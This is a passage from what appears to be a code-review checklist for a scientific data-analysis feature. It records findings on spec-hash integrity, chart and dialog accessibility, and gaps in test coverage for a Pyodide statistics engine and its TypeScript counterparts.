      every read path re-signs via `createBucketSignedUrl`. Note that the only committed
      evidence of the `user` bucket being flipped to private is a **commented-out**
      statement at `scripts/057_security_hardening.sql:141`, so the flag itself was set
      by hand outside the migration chain. Worth confirming directly.
- [ ] **L14** `spec_hash` and `data_version_hash` are verified server-side.
      **Fails by design**: `commit_analysis_revision` accepts both as caller-supplied
      parameters and stores them without recomputing from `p_spec`. The integrity
      guarantee is entirely application-layer. `openRevision` is currently the only
      reader, so nothing bypasses it today, but a second consumer (a report export, a
      share link, a backend job) reading `analysis_revisions.results` directly would
      display a drifted result with no check.
- [ ] **L15** A spec saved by a newer build fails safe when opened by an older one.
      `migrateSpec` special-cases only version 0; a *newer* `schemaVersion` goes straight
      to `parseSpec`. Verify rollback behaviour if rollback matters.
- [ ] **L16** Stored JSON has a size cap. **Confirmed absent**, and deliberately so:
      `105_saved_analyses.sql:99-101` documents `data_snapshot_is_manifest` as the escape
      hatch for oversized snapshots and leaves "the threshold open". Nothing computes or
      enforces it.

---

## K. Accessibility of a scientific figure

A chart is the primary output of this feature. If it is unreadable to assistive
technology, the result is unreadable, not merely inconvenient.

- [ ] **K1** A chart's accessible name conveys chart type, axes, and at least one
      concrete result value. **Confirmed to fail**: `figure-canvas.tsx` sets
      `role="img" aria-label={spec.figure.title || "Analysis figure"}`. `role="img"`
      additionally removes every descendant SVG text node (axis labels, legend, data
      labels) from the accessibility tree, so a screen-reader user gets the title and
      nothing else. The `EngineResult` already holds everything a one-sentence summary
      would need.
- [ ] **K2** The results card is programmatically associated with the chart, not merely
      DOM-adjacent. **Confirmed to fail**: neither `figure-canvas.tsx` nor
      `plotly-chart.tsx` carries `aria-describedby` pointing at `results-card.tsx`.
- [ ] **K3** A data-table or structured-text fallback for the chart is reachable without
      a mouse. **Confirmed absent.**
- [ ] **K4** The AI reply block announces itself. **Confirmed to fail**:
      `data-analysis-workspace.tsx:3186-3320` has no `aria-live`, `role="status"`, or
      `role="alert"` anywhere in its ancestry, including the clarifying question that
      blocks progress. Two correct patterns already exist in this feature and are
      directly copyable: `analysis-header.tsx:48` and `reopen-banner.tsx:56-57`.
- [ ] **K5** The "Working…" busy state is exposed via `aria-busy` or a live region, not
      only as button-label text.
- [ ] **K6** Recomputing a statistic announces the new value. **Confirmed to fail** in
      both `results-card.tsx` and `stats-panel.tsx`: a sighted user sees the numbers
      swap, a screen-reader user gets silence.
- [ ] **K7** The exclusion dialog's live p-value preview is announced
      (`exclusion-dialog.tsx`).
- [ ] **K8** Every chart action available by right-click is reachable by keyboard.
      **Confirmed to fail**: the context menu in `plotly-chart.tsx` and
      `figure-canvas.tsx` triggers only on `onContextMenu` and is portalled to
      `document.body`. Zoom, reset, edit-element, and download are unreachable without a
      mouse.
- [ ] **K9** Draggable chart elements have a keyboard alternative. **Confirmed to fail**
      for significance brackets, which delegate to Plotly's native shape editing. The
      `{id, offsetY}` mutation contract already exists at `plotly-adapter.ts:1562-1579`;
      only a keyboard-operable way to produce it is missing. `layout-canvas.tsx` already
      ships the button-based non-drag pattern for panel reordering.
- [ ] **K10** The plate grid uses `role="grid"/"row"/"gridcell"` with arrow-key
      navigation. **Confirmed to fail**: `plate-view.tsx` renders each well as an
      individually tab-stoppable button, so a 384-well plate is 384 sequential Tab
      stops. Wells are also named by `title` alone, which is the last fallback in the
      accessible-name computation and is invisible to touch and keyboard users.
- [ ] **K11** Custom tab controls support arrow-key roving focus. **Mixed**: the Radix
      phase switcher passes; `pipeline-tabs.tsx` fails, and because inactive tabs carry
      `tabIndex={-1}` with no arrow-key handler, they are unreachable by keyboard at all.
- [ ] **K12** Anything claiming `role="dialog" aria-modal="true"` actually traps focus,
      sets initial focus, closes on Escape, and returns focus. **Confirmed to fail** for
      `motion.tsx` `SlideOver` and `exclusion-dialog.tsx`. All Radix-based dialogs in
      this feature pass.
- [ ] **K13** The shared `Labeled` helper links its label to its input.
      **Confirmed to fail**: it wraps only the text, with no `id`/`htmlFor`, affecting
      roughly seven inputs in `plate-view.tsx` and the whole control set in
      `stats-panel.tsx`, several of which may end up with no accessible name at all. One
      fix in the helper covers both files.
- [ ] **K14** Animations respect `prefers-reduced-motion`. **Passing** —
      `workspace/motion.tsx` branches on `useReducedMotion()` in all six primitives.
      This is the one area that is uniformly correct.
- [ ] **K15** The two AI inputs have accessible names that say which one edits the
      chart. Currently they are distinct ("Describe the change you want" versus "Ask
      Catalyst") but neither states its effect, which a sighted user infers from
      position and a screen-reader user cannot.

---

## J. Test coverage gates

Baseline, measured 2026-08-14: `pnpm test` over `lib/data-analysis`,
`app/api/data-analysis`, and `__tests__/unit/figure-canvas-shape-drag.test.tsx` runs
**31 files, 691 tests, all passing**, no skips. The suite is genuinely strong at the
pure-function layer and has almost nothing at the integration seams, which is precisely
where this feature's historical bugs lived.

- [ ] **J1** There is at least one test executing `notes9_engine.py`. **Currently zero**,
      across the whole tree, the worktrees, and the sibling `../AI` repo. Worse, two
      comments (`engine/worker.ts:7` and `engine/client.test.ts:29`) both say scipy's
      job "is asserted against the validation corpus, not here" — **no such corpus
      exists anywhere.** A developer reading either comment would reasonably conclude
      engine correctness is covered. It is not. The four hand-rolled routines
      (Kaplan-Meier, log-rank, Dunn, Mauchly) are the most bug-prone code in the stack
      and have the least validation of anything in it.
- [ ] **J2** There is a TS↔Python agreement test for every test implemented in both.
      **Currently zero.** `statistics.ts` is live, not dead: imported by
      `components/data-analysis/stats-panel.tsx` and by `workspace/prep-offers.ts`,
      running ANOVA, Welch ANOVA, Tukey, Mann-Whitney, Wilcoxon, Kruskal and Dunn
      client-side alongside the Python equivalents.
- [ ] **J3** Golden values come from R or scipy, not from a previous run of this code.
      **Mostly failing.** `curve-fitting.test.ts` is entirely parameter-recovery on
      synthetic data the same author generated. `statistics.test.ts` checks the whole
      ANOVA family only by SS-decomposition identity, `p ∈ [0,1]` bounds, and one
      implementation against another in the same file — **no F-statistic or p-value is
      checked against an external reference.** The genuine golden values are narrow:
      Fisher's tea-tasting table, a hand-computable McNemar, published critical values in
      `distributions.test.ts` (at loose `toBeCloseTo(x, 1)` precision in places), and one
      excellent block in `plotly-adapter.test.ts:~508` checking error-bar arithmetic
      against numpy/scipy to ten decimals. A wrong `oneWayAnova` F formula or a wrong
      `tukeyHSD` critical-value lookup sails through today.
- [ ] **J4** `chart-export.ts`, `palettes.ts`, `detect.ts`, `plate.ts`, `templates.ts`,
      and `engine/worker.ts` each have a test file. **Currently none do.**
- [ ] **J5** The real worker round trip is exercised. **Currently failing**:
      `client.test.ts` uses an explicit `FakeWorker`, and `engine/worker.ts` — the file
      that boots Pyodide, fetches `notes9_engine.py`, and calls scipy — has no test.
      The path browser → worker → Pyodide → engine → result is never executed by any
      automated test. A field rename between `resolver.ts` output and what the Python
      expects breaks every analysis in production while both test files stay green.
- [ ] **J6** There is an end-to-end journey that loads a file, generates a plot, and
      asserts on it. **Currently failing**: no Playwright config, no `e2e/` directory.
      The only test that mounts a real component is
      `__tests__/unit/figure-canvas-shape-drag.test.tsx`, which drives one interaction on
      `FigureCanvas` against real plotly.js. It is a good test; it is one component, one
      interaction, out of ~9,300 lines of components.
- [ ] **J7** The chart-type map is asserted total over `FigureKind`, not over the 22
      rail types (`lib/data-analysis/workspace/chart-state-spec.test.ts:34-52`).
- [ ] **J8** The AI wire contract fixture stays byte-identical across repos.
      **Currently passing and genuinely dual-sided**:
      `lib/data-analysis/spec/spec-patch-proposal.contract-fixture.json` is asserted in
      `mutation-schema.test.ts`, and the byte-identical copy at
      `../AI/catalyst/tests/fixtures/` is exercised by `test_analysis_spec_router.py`.
      This is a real cross-repo contract test, not an aspiration.
- [ ] **J9** Every `SpecMutation` kind has a valid example and appears in exactly one of
      `ALLOWED_MUTATION_KINDS` / `FORBIDDEN_MUTATION_KINDS`. **Currently passing**,
      enforced by an anti-drift assertion rather than by hand, alongside a named
      regression test for the historical `data.setFilters` wrong-field-name bug. This is
      the best-tested part of the feature.
- [ ] **J10** A fix for an integration bug adds a test **at the seam that broke**, not
      only at the pure function it calls. The guard functions were extracted from the
      shell specifically to make them testable, which was right, but it means the tests
      prove the pure functions are correct and **not** that the 3,941-line shell calls
      them at the right point in its effect cycle. That wiring is verified only by manual
      QA, and it is exactly where "rail-over-spec in four disguises" lived.
- [ ] **J11** A comment claiming test coverage is never merged unless that coverage
      exists. Grep for the referenced name before approving. See J1.
- [ ] **J12** No PR adds a second implementation of an existing statistical test without
      a recorded decision on which one is authoritative for user-facing numbers.
- [ ] **J13** No test asserts its own defect as the premise. Ask of each new test: would
      this still pass if the bug came back?
